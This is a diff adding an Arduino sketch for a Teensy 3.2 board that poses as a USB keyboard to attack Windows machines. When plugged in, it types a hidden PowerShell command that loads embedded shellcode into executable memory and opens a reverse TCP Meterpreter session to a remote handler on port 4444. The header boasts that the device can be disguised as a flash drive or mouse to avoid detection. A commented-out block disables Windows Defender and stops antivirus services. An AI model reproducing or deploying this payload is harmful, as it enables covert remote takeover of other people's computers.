@@ -1,0 +1,306 @@
+/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+*                                                        *         W H A T  TO  K N O W          *                                                 *
+*            * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *             *
+*            *   Arduino IDE can compile C/C++ programs consist of only two functions:                                               *             *
+*            *                                                                                                                       *             *
+*            *   + setup(): This function is called when the Compiled Program Starts                                                 *             *
+*            *              to execute after power-up or reset. It is used to prepare                                                *             *
+*            *              variables, input and output pin modes and other included                                                 *             *
+*            *              libraries to execute                                                                                     *             *
+*            *                                                                                                                       *             *
+*            *   + loop() : This funtion is called after the setup() which is executed                                               *             *
+*            *              repeatedly in the Main Program. This function controls the                                               *             *
+*            *              board until is powered of or is reset                                                                    *             *
+*            *                                                                                                                       *             *
+*            * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *             *
+*                                                                                                                                                  *      
+*                                                                                                                                                  *
+* Description:                                                                                                                                     *
+*                                                                                                                                                  *
+* This Program is C based compiled on Arduino IDE which is made for the Teensy 3.2 Board in order                                                  *
+* to create a Reverse TCP Connection with a Remote Host and the Remote Handler. This will open                                                     *
+* a TCP Session using Meterpreter with a Remote Host for Exploitation & Educational Purposes Only.                                                 *
+* It will use Powershell injection & Payload ( Shell to Meterpreter ) in order to achieve our goal.                                                *
+* The Reverse TCP Session uses Port: 4444 and the IP Address of the Remote Handler. The Teensy 3.2                                                 *
+* is the perfect match for this "job" cause it's tiny and can be disguised to look like an ordinary                                                *
+* USB Device (e.g. flash drive, mouse, keyboard etc.) without being Detected easily. Once the                                                      *
+* reverse TCP connection has been established, the remote handler can exploit the Remote Host. All                                                 *
+* this Process can happen within 45 Seconds. The devices i have tested opened Sessions from 13-35                                                  *
+* Seconds.                                                                                                                                         *
+*                                                                                                                                                  *
+* Devices Tested: Windows 10 x64, Windows 10 x86, Windows 7 x64, Windows 7 x86,                                                                    *
+*                 Windows Tablet(Windows 8.1 x86)                                                                                                  *
+*                                                                                                                                                  *
+*                                                                                                                                                  *
+* Author:                                                                                                                                          *
+*                                                                                                                                                  *
+* Konstantinos Agritelis / 1441704                                                                                                                 *
+*                                                                                                                                                  *
+* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
+
+
+
+    // Teensy has it's LED on pin 13.
+    const unsigned int ledPin = 13;                                    
+
+    void setup()
+    {
+        pinMode(ledPin, OUTPUT);
+        digitalWrite(ledPin, HIGH);
+        delay(500);
+        digitalWrite(ledPin, LOW);
+        // This calls the Driver Check
+        drivers();
+        // This calls the Payload.                                                    
+        Payload();                                                    
+    }
+
+    // We won't use loop...Also we can't remove it.
+    void loop()                                                        
+    {
+    }
+
+
+    void drivers()                                                     
+    {
+        // Check and see if we can turn on Caps Lock.
+        boolean Check = enCaps();             
+        // Press Caps Lock.              
+        while (Check == enCaps())                           
+        {
+            returnCode(1, 500);
+            CapsLock();
+        }
+        CapsLock();
+    }
+
+    // Check if Caps Lock is Enabled/Disabled.
+    boolean enCaps()                                                
+    {
+        if ((keyboardLED() & 2) == 2)
+        {
+            // Caps Lock Enabled
+            return true;
+        }
+        else
+        {
+            // Caps Lock Disabled
+            return false;
+        }
+    }
+    
+     /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+     *                                                                                *
+     *  1=num lock, 2=caps lock, 3=both num lock and caps lock                        *
+     *  00000001 = num lock                                                           *
+     *  00000010 = caps lock                                                          *
+     *  00000011 = both num lock and caps lock                                        *
+     *                                                                                *
+     * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
+
+    // Keyboard LED status.
+    unsigned int keyboardLED()                                          
+    {
+        return int(keyboard_leds);
+    }
+
+    // We will use a returnCode(Blink, Timer) to track our Progress
+    void returnCode(unsigned int Blink, unsigned int Timer)
+    {
+        unsigned int count=0;
+        for(count = 0; count != Blink; count++)
+    {
+        digitalWrite(ledPin, HIGH);
+        delay(Timer);
+        digitalWrite(ledPin, LOW);
+        delay(Timer);
+        }
+    }
+
+    // Press the Caps Lock button.
+    void CapsLock()                                                     
+    {
+    Keyboard.set_key1(KEY_CAPS_LOCK);
+    Keyboard.send_now();
+    delay(100);
+    clearKeys();
+    }
+
+    // Empty the keystroke buffer. 
+    void clearKeys()                                                  
+    {
+    Keyboard.set_modifier(0);
+    Keyboard.set_key1(0);
+    Keyboard.send_now();
+        delay(100);
+    }
+
+    // Disable Caps Lock.
+    void Disable()                                                    
+    {
+        if (enCaps())
+        {
+            CapsLock();
+        }
+    }
+
+     /* * * * * * * * * * * * *
+     *                        *
+     *     P A Y L O A D      *
+     *       S T A R T        *
+     *                        *
+     * * * * * * * * * * * * */
+
+    void Payload()                                                     
+    {
+        // Disable Caps Lock if it's Enabled.
+        Disable();  
+                                                       
+    // Keyboard is ready.
+    returnCode(1, 100);    
+                                            
+    // Open the Run dialog.
+    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);                  
+    Keyboard.set_key1(KEY_R);
+    Keyboard.send_now();
+    clearKeys();
+    
+    delay(1000);
+    
+    // Run Dialog Ready.
+    returnCode(1, 100);                                            
+
+    // Start CMD small with dark text.
+    Keyboard.print("cmd.exe /K mode CON: COLS=15 LINES=1");  
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now();
+    clearKeys();  
+                                                     
+    // Wait for CDM to Start.
+    delay(3000); 
+                                                      
+    // CMD Ready.
+    returnCode(1, 100);                                            
+    
+    // The next line sets the Powershell path based on system's architecture.
+    Keyboard.println("if exist C:\\Windows\\SysWOW64 ( set WINPSWOW64=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set WINPSWOW64=powershell )");
+    
+    // Ready!
+    returnCode(1, 100);        
+
+
+    /* TEST CODE
+    Keyboard.print("PowerShell Set-MpPreference -DisableRealtimeMonitoring 1");
+    delay(3000); 
+    Keyboard.print("net stop "Malwarebytes Service" /y");
+    delay(3000); 
+    Keyboard.print("net stop "avast! Antivirus" /y");
+    delay(3000); 
+    */
+    
+    /* * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+    *                                                        *
+    *              P A Y L O A D                             *
+    *  S H E L L  T O  M E T E R P R E T E R                 * 
+    *                                                        *
+    * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
+    
+    Keyboard.print("%WINPSWOW64% -nop -w hidden -c \"$1 = '$c = ''");
+    Keyboard.print("[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);");
+    Keyboard.print("[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint  dwCreationFlags, IntPtr lpThreadId);");
+    Keyboard.print("[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';");
+    Keyboard.print("$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];");
+    Keyboard.print("[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,");
+    Keyboard.print("0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,");
+    Keyboard.print("0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,");
+    Keyboard.print("0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,");
+    Keyboard.print("0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,");
+    Keyboard.print("0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,");
+    Keyboard.print("0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,");
+    Keyboard.print("0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,");
+    Keyboard.print("0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,");
+    Keyboard.print("0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,");
+    Keyboard.print("0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,");
+    Keyboard.print("0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,");
+    Keyboard.print("0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,");
+    Keyboard.print("0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,");
+    Keyboard.print("0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,");
+    Keyboard.print("0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,");
+    Keyboard.print("0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,");
+    Keyboard.print("0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,");
+
+
+     /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+     *                                                                                * 
+     *            IP Address @@ | Port FF                                             *
+     *  {0x@@,0x@@,0x@@,0x@@,0x68,0x02,0x00,0xFF,0xFF}                                *
+     *                                                                                *
+     * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
+     
+
+    Keyboard.print("0x01,0x01,0x01,0x02,0x68,0x02,0x00,0x11,0x5c,");
+
+    Keyboard.print("0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,");
+    Keyboard.print("0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,");
+    Keyboard.print("0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,");
+    Keyboard.print("0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,");
+    Keyboard.print("0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,");
+    Keyboard.print("0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,");
+    Keyboard.print("0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,");
+    Keyboard.print("0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,");
+    Keyboard.print("0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,");
+    Keyboard.print("0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;");
+    
+    // Calculate the correct parameter size for VirtualAlloc
+    Keyboard.print("$size = 0x1000;");
+    Keyboard.print("if ($sc.Length -gt 0x1000){$size = $sc.Length};");
+    
+    // Allocate a page of memory. This will work only if the size of 3rd parameter is at least 0x1000.
+    // Allocate RWX(Read Write Execute) memory block
+    Keyboard.print("$x=$w::VirtualAlloc(0,0x1000,$size,0x40);");
+    // Use memcpy that requires a .NET Class to cast $sc as an IntPtr
+    Keyboard.print("for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};");
+    // Executes Payload
+    Keyboard.print("$w::CreateThread(0,0,$x,0,0,0);"); 
+
+    Keyboard.print("for (;;){Start-sleep 60};';");
+    //Request base64 encoding. This will alter the number of blocks to insert
+    Keyboard.print("$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));");
+    
+    //syswow64 lets you run 32 bit system executables from 64 bit code.
+    Keyboard.print("if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell\\\";");
+    
+    /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+    *                                                                                                                                *
+    * -NoProfile        Do not load the PowerShell profile.                                                                          *
+    *                   When setting up a scheduled job, using -NoProfile can be a quick way                                         *
+    *                   to document the fact that nothing special in the profile is needed.                                          *
+    *                   It also ensures that any future profile changes will not affect the job.                                     *
+    *                                                                                                                                *
+    * -Noninteractive   Don't present an interactive prompt to user.                                                                 *
+    *                                                                                                                                *
+    *                                                                                                                                *
+    * -EncodedCommand   Accepts a base-64 encoded string version of a command, We use this to                                        *
+    *                   submit commands to PowerShell that require complex quotation marks                                           *
+    *                   or curly braces.                                                                                             *
+    *                                                                                                                                *
+    * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
+ 
+
+
+   
+    Keyboard.print("$cmd = \\\"-nop -noni -enc \\\";iex \\\" $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -noni -enc\\\";iex \\\" powershell $cmd $gq\\\";}\"");
+    clearKeys();
+    // Send the command.
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now();                                           
+    delay(100);
+    clearKeys();
+    // Done!
+    returnCode(1, 1000);                                           
+    }
+
+
+
+
+
